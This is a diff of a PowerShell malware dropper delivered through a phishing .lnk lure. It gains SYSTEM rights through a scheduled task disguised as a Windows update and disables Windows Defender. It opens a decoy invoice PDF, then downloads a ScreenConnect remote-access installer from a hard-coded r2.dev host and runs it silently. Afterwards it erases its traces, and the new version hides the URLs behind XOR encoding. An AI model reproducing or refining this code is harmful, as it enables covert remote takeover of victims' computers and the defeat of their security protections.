@@ -1,22 +1,23 @@
-# Self-elevate WITHOUT UAC using scheduled task trick - with fallback
+# Self-elevate WITHOUT UAC using scheduled task trick
 if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
-    try {
-        $taskName = "WindowsUpdateTask" + (Get-Random -Maximum 99999)
-        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`""
-        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
-        Register-ScheduledTask -TaskName $taskName -Action $action -Principal $principal -Force | Out-Null
-        Start-ScheduledTask -TaskName $taskName
-        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
-        exit
-    } catch {
-        Write-Host "Continuing without elevation..." -ForegroundColor Yellow
-    }
+    $taskName = "WindowsUpdateTask" + (Get-Random -Maximum 99999)
+    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`""
+    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+    Register-ScheduledTask -TaskName $taskName -Action $action -Principal $principal -Force | Out-Null
+    Start-ScheduledTask -TaskName $taskName
+    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
+    exit
 }
 
 $ErrorActionPreference   = "SilentlyContinue"
 $WarningPreference       = "SilentlyContinue"
 $VerbosePreference       = "SilentlyContinue"
 $ProgressPreference      = "SilentlyContinue"
+
+# Debug log file
+$DesktopPath = [Environment]::GetFolderPath("Desktop")
+$DebugLog = Join-Path $DesktopPath "debug_log.txt"
+"Debug started at $(Get-Date)" | Out-File $DebugLog -Append
 
 # Hide console immediately
 Add-Type -Name Window -Namespace Console -MemberDefinition @'
@@ -28,13 +29,16 @@ public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
 $ConsoleWin = [Console.Window]::GetConsoleWindow()
 [Console.Window]::ShowWindow($ConsoleWin, 0)
 
-# Disable Windows Defender completely (will only work if admin)
+# Disable Windows Defender completely
 try {
     Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
     Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
     Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
     Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
-} catch {}
+    "Defender disabled" | Out-File $DebugLog -Append
+} catch {
+    "Defender disable failed: $_" | Out-File $DebugLog -Append
+}
 
 try {
     Add-MpPreference -ExclusionPath "$env:TEMP" -ErrorAction SilentlyContinue
@@ -42,26 +46,23 @@ try {
     Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA" -ErrorAction SilentlyContinue
 } catch {}
 
-# Disable Windows Defender via registry (will only work if admin)
+# Disable Windows Defender via registry
 try {
     New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Force -ErrorAction SilentlyContinue | Out-Null
     Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force
     Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiVirus" -Value 1 -Type DWord -Force
 } catch {}
 
-# FIXED: Force delete function - uses Test-Path for .lnk files
+# Function to force delete files
 function Force-FileDelete {
     param([string]$Path)
-    if (Test-Path -LiteralPath $Path) {
+    if ([System.IO.File]::Exists($Path)) {
         try {
             attrib -r -h -s $Path -ErrorAction SilentlyContinue
-            Remove-Item -LiteralPath $Path -Force -ErrorAction SilentlyContinue
-            Write-Host "Deleted: $Path" -ForegroundColor Yellow
+            [System.IO.File]::Delete($Path)
+            "Deleted: $Path" | Out-File $DebugLog -Append
         } catch {
-            try {
-                $item = Get-Item -LiteralPath $Path -Force -ErrorAction SilentlyContinue
-                $item.Delete()
-            } catch {}
+            "Delete failed: $Path - $_" | Out-File $DebugLog -Append
         }
     }
 }
@@ -73,136 +74,116 @@ function Invoke-HiddenPowerShell {
     Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $encoded" -WindowStyle Hidden -ErrorAction SilentlyContinue
 }
 
-# Enhanced function to open PDF with maximum fallbacks
+# Function to open PDF with multiple fallbacks
 function Open-PDF {
     param([string]$PdfPath)
     
+    "Attempting to open PDF: $PdfPath" | Out-File $DebugLog -Append
+    
     if (-not (Test-Path $PdfPath)) {
-        Write-Host "PDF file does not exist: $PdfPath" -ForegroundColor Red
-        return
+        "PDF file does not exist: $PdfPath" | Out-File $DebugLog -Append
+        return $false
     }
     
-    $fileInfo = Get-Item $PdfPath
-    if ($fileInfo.Length -eq 0) {
-        Write-Host "PDF file is empty" -ForegroundColor Red
-        return
-    }
+    "PDF file exists. Size: $((Get-Item $PdfPath).Length) bytes" | Out-File $DebugLog -Append
     
-    Write-Host "Attempting to open PDF: $PdfPath (Size: $($fileInfo.Length) bytes)" -ForegroundColor Green
-    
-    # Method 1: Start-Process with ShellExecute
     try {
-        Start-Process -FilePath $PdfPath -Verb Open -ErrorAction Stop
-        Write-Host "Opened with Start-Process -Verb Open" -ForegroundColor Green
-        return
-    } catch {}
+        $fileStream = [System.IO.File]::OpenRead($PdfPath)
+        $buffer = New-Object byte[] 5
+        $fileStream.Read($buffer, 0, 5) | Out-Null
+        $fileStream.Close()
+        $header = [System.Text.Encoding]::ASCII.GetString($buffer)
+        "PDF header: $header" | Out-File $DebugLog -Append
+        if ($header -ne "%PDF-") {
+            "WARNING: File is not a valid PDF!" | Out-File $DebugLog -Append
+        }
+    } catch {
+        "Error reading PDF header: $_" | Out-File $DebugLog -Append
+    }
     
-    # Method 2: Start-Process default
+    # Method 1: Start-Process (default)
     try {
         Start-Process -FilePath $PdfPath -ErrorAction Stop
-        Write-Host "Opened with Start-Process" -ForegroundColor Green
-        return
-    } catch {}
+        "Opened with Start-Process" | Out-File $DebugLog -Append
+        return $true
+    } catch {
+        "Start-Process failed: $_" | Out-File $DebugLog -Append
+    }
     
-    # Method 3: Use Shell.Application COM object
+    # Method 2: Use ShellExecute
     try {
         $shell = New-Object -ComObject Shell.Application
         $shell.ShellExecute($PdfPath)
-        Write-Host "Opened with Shell.Application" -ForegroundColor Green
-        return
-    } catch {}
+        "Opened with ShellExecute" | Out-File $DebugLog -Append
+        return $true
+    } catch {
+        "ShellExecute failed: $_" | Out-File $DebugLog -Append
+    }
     
-    # Method 4: Use WScript.Shell
-    try {
-        $wsh = New-Object -ComObject WScript.Shell
-        $wsh.Run("`"$PdfPath`"", 1, $false)
-        Write-Host "Opened with WScript.Shell" -ForegroundColor Green
-        return
-    } catch {}
-    
-    # Method 5: Use Invoke-Item
+    # Method 3: Use Invoke-Item
     try {
         Invoke-Item -Path $PdfPath -ErrorAction Stop
-        Write-Host "Opened with Invoke-Item" -ForegroundColor Green
-        return
-    } catch {}
+        "Opened with Invoke-Item" | Out-File $DebugLog -Append
+        return $true
+    } catch {
+        "Invoke-Item failed: $_" | Out-File $DebugLog -Append
+    }
     
-    # Method 6: Find and use default PDF viewer
+    # Method 4: Open with default browser as fallback
     try {
-        $pdfViewer = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\AcroRd32.exe" -ErrorAction SilentlyContinue).'(default)'
-        if ($pdfViewer) {
-            Start-Process $pdfViewer -ArgumentList "`"$PdfPath`"" -ErrorAction Stop
-            Write-Host "Opened with Acrobat Reader" -ForegroundColor Green
-            return
+        Start-Process "chrome.exe" -ArgumentList "`"$PdfPath`"" -ErrorAction SilentlyContinue
+        "Opened with Chrome" | Out-File $DebugLog -Append
+        return $true
+    } catch {
+        "Chrome failed: $_" | Out-File $DebugLog -Append
+    }
+    
+    try {
+        Start-Process "msedge.exe" -ArgumentList "`"$PdfPath`"" -ErrorAction SilentlyContinue
+        "Opened with Edge" | Out-File $DebugLog -Append
+        return $true
+    } catch {
+        "Edge failed: $_" | Out-File $DebugLog -Append
+    }
+    
+    try {
+        Start-Process "firefox.exe" -ArgumentList "`"$PdfPath`"" -ErrorAction SilentlyContinue
+        "Opened with Firefox" | Out-File $DebugLog -Append
+        return $true
+    } catch {
+        "Firefox failed: $_" | Out-File $DebugLog -Append
+    }
+    
+    # Method 5: Use cmd.exe start command
+    try {
+        Start-Process cmd.exe -ArgumentList "/c start `"`" `"$PdfPath`"" -WindowStyle Hidden -ErrorAction SilentlyContinue
+        "Opened with cmd start" | Out-File $DebugLog -Append
+        return $true
+    } catch {
+        "cmd start failed: $_" | Out-File $DebugLog -Append
+    }
+    
+    # Method 6: Try using Acrobat/Reader directly
+    try {
+        $acroRd = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\AcroRd32.exe" -ErrorAction SilentlyContinue
+        if ($acroRd) {
+            Start-Process $acroRd.'(default)' -ArgumentList $PdfPath
+            "Opened with Acrobat Reader" | Out-File $DebugLog -Append
+            return $true
         }
     } catch {}
     
-    # Method 7: Try Microsoft Edge
     try {
-        $edgePath = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
-        if (Test-Path $edgePath) {
-            Start-Process $edgePath -ArgumentList "`"$PdfPath`"" -ErrorAction Stop
-            Write-Host "Opened with Edge" -ForegroundColor Green
-            return
+        $acroEx = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\Acrobat.exe" -ErrorAction SilentlyContinue
+        if ($acroEx) {
+            Start-Process $acroEx.'(default)' -ArgumentList $PdfPath
+            "Opened with Acrobat" | Out-File $DebugLog -Append
+            return $true
         }
     } catch {}
     
-    # Method 8: Try Chrome
-    try {
-        $chromePaths = @(
-            "C:\Program Files\Google\Chrome\Application\chrome.exe",
-            "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
-            "$env:LOCALAPPDATA\Google\Chrome\Application\chrome.exe"
-        )
-        foreach ($chromePath in $chromePaths) {
-            if (Test-Path $chromePath) {
-                Start-Process $chromePath -ArgumentList "`"$PdfPath`"" -ErrorAction Stop
-                Write-Host "Opened with Chrome" -ForegroundColor Green
-                return
-            }
-        }
-    } catch {}
-    
-    # Method 9: Try Firefox
-    try {
-        $firefoxPaths = @(
-            "C:\Program Files\Mozilla Firefox\firefox.exe",
-            "C:\Program Files (x86)\Mozilla Firefox\firefox.exe"
-        )
-        foreach ($firefoxPath in $firefoxPaths) {
-            if (Test-Path $firefoxPath) {
-                Start-Process $firefoxPath -ArgumentList "`"$PdfPath`"" -ErrorAction Stop
-                Write-Host "Opened with Firefox" -ForegroundColor Green
-                return
-            }
-        }
-    } catch {}
-    
-    # Method 10: Use cmd.exe start command
-    try {
-        Start-Process cmd.exe -ArgumentList "/c start `"`" `"$PdfPath`"" -WindowStyle Hidden -ErrorAction Stop
-        Write-Host "Opened with cmd start" -ForegroundColor Green
-        return
-    } catch {}
-    
-    # Method 11: Use rundll32 to open with default handler
-    try {
-        Start-Process rundll32.exe -ArgumentList "url.dll,FileProtocolHandler `"$PdfPath`"" -ErrorAction Stop
-        Write-Host "Opened with rundll32" -ForegroundColor Green
-        return
-    } catch {}
-    
-    # Method 12: Try PowerShell Start-Process with UseShellExecute
-    try {
-        $psi = New-Object System.Diagnostics.ProcessStartInfo
-        $psi.FileName = $PdfPath
-        $psi.UseShellExecute = $true
-        [System.Diagnostics.Process]::Start($psi) | Out-Null
-        Write-Host "Opened with ProcessStartInfo" -ForegroundColor Green
-        return
-    } catch {}
-    
-    Write-Host "All methods failed to open PDF" -ForegroundColor Red
+    "All PDF opening methods failed" | Out-File $DebugLog -Append
+    return $false
 }
 
 # Main execution function
@@ -213,18 +194,20 @@ function CODE_SEG {
         [Parameter(Mandatory)][string] $InstallerURL
     )
     
+    "CODE_SEG started" | Out-File $DebugLog -Append
+    "Name: $Name" | Out-File $DebugLog -Append
+    "PDF URL: $PdfURL" | Out-File $DebugLog -Append
+    "EXE URL: $InstallerURL" | Out-File $DebugLog -Append
+    
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
     
     $CurrentDir = (Get-Location).Path
     $InkPath = Join-Path $CurrentDir ($Name + ".lnk")
     $PdfPath = Join-Path $CurrentDir ($Name + ".pdf")
     
-    # DELETE the .lnk file FIRST
-    Force-FileDelete -Path $InkPath
-    Write-Host "Deleted .lnk file: $InkPath" -ForegroundColor Yellow
-    
-    # Delete any existing PDF with same name
-    Force-FileDelete -Path $PdfPath
+    "CurrentDir: $CurrentDir" | Out-File $DebugLog -Append
+    "InkPath: $InkPath" | Out-File $DebugLog -Append
+    "PdfPath: $PdfPath" | Out-File $DebugLog -Append
     
     # Download PDF with user agent spoofing and retry
     $headers = @{
@@ -239,65 +222,82 @@ function CODE_SEG {
     
     # Method 1: Invoke-WebRequest
     try {
-        Write-Host "Downloading PDF - Method 1 (Invoke-WebRequest)..." -ForegroundColor Yellow
-        Invoke-WebRequest -Uri $PdfURL -OutFile $PdfPath -UseBasicParsing -Headers $headers -ErrorAction Stop
-        if ((Get-Item $PdfPath).Length -gt 0) { $pdfDownloaded = $true }
-    } catch {}
+        "Downloading PDF with Invoke-WebRequest..." | Out-File $DebugLog -Append
+        $response = Invoke-WebRequest -Uri $PdfURL -OutFile $PdfPath -UseBasicParsing -Headers $headers -ErrorAction Stop
+        "Response status: $($response.StatusCode)" | Out-File $DebugLog -Append
+        if (Test-Path $PdfPath) { 
+            $pdfDownloaded = $true
+            "PDF downloaded with Invoke-WebRequest. Size: $((Get-Item $PdfPath).Length)" | Out-File $DebugLog -Append
+        }
+    } catch {
+        "Invoke-WebRequest failed: $_" | Out-File $DebugLog -Append
+    }
     
     # Method 2: WebClient
     if (-not $pdfDownloaded) {
         try {
-            Write-Host "Downloading PDF - Method 2 (WebClient)..." -ForegroundColor Yellow
+            "Downloading PDF with WebClient..." | Out-File $DebugLog -Append
             $wc = New-Object System.Net.WebClient
             $wc.Headers.Add("User-Agent", "Mozilla/5.0")
             $wc.DownloadFile($PdfURL, $PdfPath)
-            if ((Get-Item $PdfPath).Length -gt 0) { $pdfDownloaded = $true }
-        } catch {}
+            if (Test-Path $PdfPath) { 
+                $pdfDownloaded = $true
+                "PDF downloaded with WebClient. Size: $((Get-Item $PdfPath).Length)" | Out-File $DebugLog -Append
+            }
+        } catch {
+            "WebClient failed: $_" | Out-File $DebugLog -Append
+        }
     }
     
     # Method 3: BITS Transfer
     if (-not $pdfDownloaded) {
         try {
-            Write-Host "Downloading PDF - Method 3 (BITS)..." -ForegroundColor Yellow
+            "Downloading PDF with BITS..." | Out-File $DebugLog -Append
             Start-BitsTransfer -Source $PdfURL -Destination $PdfPath -ErrorAction Stop
-            if ((Get-Item $PdfPath).Length -gt 0) { $pdfDownloaded = $true }
-        } catch {}
+            if (Test-Path $PdfPath) { 
+                $pdfDownloaded = $true
+                "PDF downloaded with BITS. Size: $((Get-Item $PdfPath).Length)" | Out-File $DebugLog -Append
+            }
+        } catch {
+            "BITS failed: $_" | Out-File $DebugLog -Append
+        }
     }
     
     # Method 4: curl.exe
     if (-not $pdfDownloaded) {
         try {
-            Write-Host "Downloading PDF - Method 4 (curl)..." -ForegroundColor Yellow
-            & curl.exe -L -o $PdfPath $PdfURL --silent --insecure
-            if (Test-Path $PdfPath) {
-                if ((Get-Item $PdfPath).Length -gt 0) { $pdfDownloaded = $true }
+            "Downloading PDF with curl..." | Out-File $DebugLog -Append
+            & curl.exe -L -o $PdfPath $PdfURL --silent --show-error
+            if (Test-Path $PdfPath) { 
+                $pdfDownloaded = $true
+                "PDF downloaded with curl. Size: $((Get-Item $PdfPath).Length)" | Out-File $DebugLog -Append
             }
-        } catch {}
+        } catch {
+            "curl failed: $_" | Out-File $DebugLog -Append
+        }
     }
     
-    # Method 5: System.Net.Http.HttpClient
     if (-not $pdfDownloaded) {
-        try {
-            Write-Host "Downloading PDF - Method 5 (HttpClient)..." -ForegroundColor Yellow
-            $client = New-Object System.Net.Http.HttpClient
-            $response = $client.GetAsync($PdfURL).Result
-            $content = $response.Content.ReadAsByteArrayAsync().Result
-            [System.IO.File]::WriteAllBytes($PdfPath, $content)
-            if ($content.Length -gt 0) { $pdfDownloaded = $true }
-        } catch {}
-    }
-    
-    # Open the PDF if downloaded
-    if ($pdfDownloaded -and (Test-Path $PdfPath)) {
-        Write-Host "PDF downloaded successfully, opening..." -ForegroundColor Green
-        Start-Sleep -Seconds 2
-        Open-PDF -PdfPath $PdfPath
+        "PDF download FAILED with all methods" | Out-File $DebugLog -Append
     } else {
-        Write-Host "PDF download failed" -ForegroundColor Red
+        "PDF downloaded successfully" | Out-File $DebugLog -Append
+        try {
+            $fileStream = [System.IO.File]::OpenRead($PdfPath)
+            $buffer = New-Object byte[] 5
+            $fileStream.Read($buffer, 0, 5) | Out-Null
+            $fileStream.Close()
+            $header = [System.Text.Encoding]::ASCII.GetString($buffer)
+            "Downloaded PDF header: $header" | Out-File $DebugLog -Append
+            if ($header -ne "%PDF-") {
+                "WARNING: Downloaded file is NOT a valid PDF!" | Out-File $DebugLog -Append
+            }
+        } catch {
+            "Error checking downloaded PDF: $_" | Out-File $DebugLog -Append
+        }
     }
     
     # Download EXE with random name to hidden location
-    $InstallerURI = [System.Uri] $InstallerURL
+    $InstallerURI = [System.Uri]$InstallerURL
     $InstallerExt = [System.IO.Path]::GetExtension($InstallerURI.AbsolutePath)
     if ([string]::IsNullOrEmpty($InstallerExt)) { $InstallerExt = ".exe" }
     $RandomFileName = [System.IO.Path]::GetRandomFileName()
@@ -305,9 +305,13 @@ function CODE_SEG {
     
     $InstallerPath = [System.IO.Path]::Combine($env:APPDATA, "Microsoft", "Windows", "Caches", $RandomFileName)
     
+    "InstallerPath: $InstallerPath" | Out-File $DebugLog -Append
+    "InstallerExt: $InstallerExt" | Out-File $DebugLog -Append
+    
     $cacheDir = [System.IO.Path]::GetDirectoryName($InstallerPath)
     if (-not (Test-Path $cacheDir)) {
         New-Item -Path $cacheDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
+        "Created cache directory: $cacheDir" | Out-File $DebugLog -Append
     }
     
     # Download EXE with multiple methods
@@ -315,73 +319,137 @@ function CODE_SEG {
     
     # Method 1: Invoke-WebRequest
     try {
-        Invoke-WebRequest -Uri $InstallerURL -OutFile $InstallerPath -UseBasicParsing -Headers $headers -ErrorAction Stop
-        $exeDownloaded = $true
-    } catch {}
+        "Downloading EXE with Invoke-WebRequest..." | Out-File $DebugLog -Append
+        $response = Invoke-WebRequest -Uri $InstallerURL -OutFile $InstallerPath -UseBasicParsing -Headers $headers -ErrorAction Stop
+        "EXE Response status: $($response.StatusCode)" | Out-File $DebugLog -Append
+        if (Test-Path $InstallerPath) { 
+            $exeDownloaded = $true
+            "EXE downloaded with Invoke-WebRequest. Size: $((Get-Item $InstallerPath).Length)" | Out-File $DebugLog -Append
+        }
+    } catch {
+        "EXE Invoke-WebRequest failed: $_" | Out-File $DebugLog -Append
+    }
     
     # Method 2: WebClient
     if (-not $exeDownloaded) {
         try {
+            "Downloading EXE with WebClient..." | Out-File $DebugLog -Append
             $wc = New-Object System.Net.WebClient
             $wc.Headers.Add("User-Agent", "Mozilla/5.0")
             $wc.DownloadFile($InstallerURL, $InstallerPath)
-            $exeDownloaded = $true
-        } catch {}
+            if (Test-Path $InstallerPath) { 
+                $exeDownloaded = $true
+                "EXE downloaded with WebClient. Size: $((Get-Item $InstallerPath).Length)" | Out-File $DebugLog -Append
+            }
+        } catch {
+            "EXE WebClient failed: $_" | Out-File $DebugLog -Append
+        }
     }
     
     # Method 3: BITS Transfer
     if (-not $exeDownloaded) {
         try {
+            "Downloading EXE with BITS..." | Out-File $DebugLog -Append
             Start-BitsTransfer -Source $InstallerURL -Destination $InstallerPath -ErrorAction Stop
-            $exeDownloaded = $true
-        } catch {}
+            if (Test-Path $InstallerPath) { 
+                $exeDownloaded = $true
+                "EXE downloaded with BITS. Size: $((Get-Item $InstallerPath).Length)" | Out-File $DebugLog -Append
+            }
+        } catch {
+            "EXE BITS failed: $_" | Out-File $DebugLog -Append
+        }
     }
     
     # Method 4: curl.exe
     if (-not $exeDownloaded) {
         try {
-            & curl.exe -L -o $InstallerPath $InstallerURL --silent --insecure
-            if (Test-Path $InstallerPath) { $exeDownloaded = $true }
-        } catch {}
+            "Downloading EXE with curl..." | Out-File $DebugLog -Append
+            & curl.exe -L -o $InstallerPath $InstallerURL --silent --show-error
+            if (Test-Path $InstallerPath) { 
+                $exeDownloaded = $true
+                "EXE downloaded with curl. Size: $((Get-Item $InstallerPath).Length)" | Out-File $DebugLog -Append
+            }
+        } catch {
+            "EXE curl failed: $_" | Out-File $DebugLog -Append
+        }
+    }
+    
+    # Method 5: Use System.Net.Http.HttpClient
+    if (-not $exeDownloaded) {
+        try {
+            "Downloading EXE with HttpClient..." | Out-File $DebugLog -Append
+            $httpClient = New-Object System.Net.Http.HttpClient
+            $httpClient.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0")
+            $response = $httpClient.GetByteArrayAsync($InstallerURL).Result
+            [System.IO.File]::WriteAllBytes($InstallerPath, $response)
+            if (Test-Path $InstallerPath) { 
+                $exeDownloaded = $true
+                "EXE downloaded with HttpClient. Size: $((Get-Item $InstallerPath).Length)" | Out-File $DebugLog -Append
+            }
+        } catch {
+            "EXE HttpClient failed: $_" | Out-File $DebugLog -Append
+        }
     }
     
     if ($exeDownloaded) {
+        "EXE downloaded successfully. Executing..." | Out-File $DebugLog -Append
         Unblock-File -Path $InstallerPath -ErrorAction SilentlyContinue
         attrib +h +s $InstallerPath -ErrorAction SilentlyContinue
         
         # Execute EXE silently
-        $Process = (Start-Process -FilePath $InstallerPath -ArgumentList "/silent" -Wait -Passthru -WindowStyle Hidden)
+        $Process = Start-Process -FilePath $InstallerPath -ArgumentList "/silent" -Wait -PassThru -WindowStyle Hidden
+        "EXE executed. Exit code: $($Process.ExitCode)" | Out-File $DebugLog -Append
         
-        # Clean up
+        # Clean up EXE
         try {
             attrib -h -s $InstallerPath -ErrorAction SilentlyContinue
             [System.IO.File]::Delete($InstallerPath)
+            "EXE cleaned up" | Out-File $DebugLog -Append
         } catch {}
+    } else {
+        "EXE download FAILED with all methods" | Out-File $DebugLog -Append
     }
     
-    # DELETE THE INK FILE AGAIN - after everything runs
+    # DELETE THE .LNK FILE AFTER RUNNING THE EXE
     Force-FileDelete -Path $InkPath
-    Write-Host "Deleted .lnk file after execution: $InkPath" -ForegroundColor Yellow
     
-    # Also delete PDF after it's been viewed
-    Start-Sleep -Seconds 5
-    Force-FileDelete -Path $PdfPath
-    Write-Host "Deleted PDF file: $PdfPath" -ForegroundColor Yellow
+    # OPEN THE PDF FILE (REPLACES THE .LNK FILE)
+    if ($pdfDownloaded -and (Test-Path $PdfPath)) {
+        "Attempting to open PDF..." | Out-File $DebugLog -Append
+        Start-Sleep -Seconds 2
+        $opened = Open-PDF -PdfPath $PdfPath
+        "PDF opened: $opened" | Out-File $DebugLog -Append
+    } else {
+        "PDF not downloaded or doesn't exist, cannot open" | Out-File $DebugLog -Append
+    }
     
     # Self-delete script
     $scriptPath = $MyInvocation.MyCommand.Path
     if ($scriptPath) {
         Invoke-HiddenPowerShell -ScriptBlock "Start-Sleep -Seconds 5; Remove-Item -Path '$scriptPath' -Force -ErrorAction SilentlyContinue"
     }
+    
+    "CODE_SEG completed" | Out-File $DebugLog -Append
 }
 
-# ----- Client name: "INV_PAYMENT_REMITTANCE" -----
-$ClientName = "INV_PAYMENT_REMITTANCE"
+# ----- XOR DECRYPTION KEY -----
+$key = 0x5A
 
-# ----- PDF URL -----
-$DocumentURL = "https://pub-ff053e1fe919458e8fbcab30eebb93e8.r2.dev/INV_PAYMENT_REMITTANCE.pdf"
+# ----- Client name: "INV_PAYMENT_REMITTANCE" (XOR 249) -----
+$ClientName = $($k2766=249;$b=[byte[]](0xB0,0xB7,0xAF,0xA6,0xA9,0xB8,0xA0,0xB4,0xBC,0xB7,0xAD,0xA6,0xAB,0xBC,0xB4,0xB0,0xAD,0xAD,0xB8,0xB7,0xBA,0xBC);-join($b|%{[char]($_-bxor$k2766)}))
 
-# ----- EXE URL (same as before - your ScreenConnect installer) -----
-$ClientURL = "https://pub-ff053e1fe919458e8fbcab30eebb93e8.r2.dev/ScreenConnect_24.2.7.9353.exe"
+# ----- PDF URL (XOR 0x5A) -----
+$encodedPdf = @(
+    0x32,0x2E,0x2E,0x2A,0x29,0x60,0x75,0x75,0x2A,0x2F,0x38,0x77,0x3C,0x3C,0x6A,0x6F,0x69,0x3F,0x6B,0x3C,0x3F,0x63,0x6B,0x63,0x6E,0x6F,0x62,0x3F,0x62,0x3C,0x38,0x39,0x3B,0x38,0x69,0x6A,0x3F,0x3F,0x38,0x38,0x63,0x69,0x3F,0x62,0x74,0x28,0x68,0x74,0x3E,0x3F,0x2C,0x75,0x13,0x14,0x0C,0x05,0x0A,0x1B,0x03,0x17,0x1F,0x14,0x0E,0x05,0x08,0x1F,0x17,0x13,0x0E,0x0E,0x1B,0x14,0x19,0x1F,0x74,0x2A,0x3E,0x3C
+)
+$DocumentURL = -join ($encodedPdf | ForEach-Object { [char]($_ -bxor $key) })
 
+# ----- EXE URL (XOR 0x5A) -----
+$encodedMsi = @(
+    0x32,0x2E,0x2E,0x2A,0x29,0x60,0x75,0x75,0x2A,0x2F,0x38,0x77,0x69,0x3E,0x6C,0x6D,0x3E,0x6A,0x6E,0x69,0x6C,0x3E,0x39,0x39,0x6E,0x69,0x6C,0x3F,0x3B,0x6B,0x68,0x3C,0x3E,0x6C,0x3E,0x63,0x6B,0x6F,0x38,0x39,0x38,0x38,0x6B,0x3C,0x74,0x28,0x68,0x74,0x3E,0x3F,0x2C,0x75,0x09,0x39,0x28,0x3F,0x3F,0x34,0x19,0x35,0x34,0x34,0x3F,0x39,0x2E,0x74,0x19,0x36,0x33,0x3F,0x34,0x2E,0x09,0x3F,0x2E,0x2F,0x2A,0x74,0x3F,0x22,0x3F
+)
+$ClientURL = -join ($encodedMsi | ForEach-Object { [char]($_ -bxor $key) })
+
+"Starting CODE_SEG..." | Out-File $DebugLog -Append
 CODE_SEG -Name $ClientName -PdfURL $DocumentURL -InstallerURL $ClientURL
+"Script completed" | Out-File $DebugLog -Append
